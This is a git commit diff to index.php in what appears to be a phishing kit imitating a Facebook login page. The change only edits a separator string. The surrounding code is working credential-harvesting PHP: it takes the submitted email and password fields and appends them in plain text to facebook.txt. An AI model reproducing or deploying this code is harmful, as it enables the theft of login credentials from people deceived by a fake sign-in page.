674335689e85941ae7ffffb6f7f2646e7aebe96e
Keke63 <barisgunes725@gmail.com>
2024-06-15 14:12:22 +0300

    Update index.php

--- Site/Facebook/Site-facebook/index.php
+++ Site/Facebook/Site-facebook/index.php
@@ -5,7 +5,7 @@ if (!empty($_POST['emails']) && !empty($_POST['passwd'])) {
 $ac = fopen("facebook.txt","a+");
 $username = $_POST['emails'];
 $password = $_POST['passwd'];
-$userlar = ("\n__________________ \n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+$userlar = ("\n________Fırat_ Güneş_________ \n Username : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
 }
